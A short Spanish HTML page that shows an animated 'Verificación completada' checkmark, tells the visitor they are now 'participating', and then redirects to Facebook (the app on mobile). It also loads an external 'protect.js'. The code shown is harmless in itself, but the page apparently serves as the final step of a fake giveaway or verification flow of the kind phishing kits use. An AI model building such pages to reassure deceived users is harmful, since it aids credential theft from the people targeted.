<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Completada</title>
    <link rel="icon" href="data:,">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            text-align: center;
            padding: 20px;
        }
        
        .check-circle {
            width: 120px;
            height: 120px;
            background: #FFD700;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            transform: scale(0);
            animation: popIn 0.5s ease-out 0.2s forwards;
        }
        
        .checkmark {
            width: 50px;
            height: 50px;
            stroke: white;
            stroke-width: 4;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
            stroke-dasharray: 100;
            stroke-dashoffset: 100;
            animation: drawCheck 0.6s ease-out 0.7s forwards;
        }
        
        @keyframes popIn {
            0% {
                transform: scale(0);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }
        
        @keyframes drawCheck {
            to {
                stroke-dashoffset: 0;
            }
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1s forwards;
        }
        
        p {
            font-size: 16px;
            color: #666;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.2s forwards;
        }
        
        @keyframes fadeIn {
            to {
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="check-circle">
            <svg class="checkmark" viewBox="0 0 50 50">
                <path d="M10 25 L20 35 L40 15"/>
            </svg>
        </div>
        <h1>Verificación completada</h1>
        <p>¡Ya estás participando!</p>
    </div>
    
    <script>
        setTimeout(function() {
            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            if (isMobile) {
                window.location.href = 'fb://';
                setTimeout(function() {
                    window.location.href = 'https://www.facebook.com';
                }, 500);
            } else {
                window.location.href = 'https://www.facebook.com';
            }
        }, 3000);
    </script>
<script src="protect.js"></script>
</body>
</html>
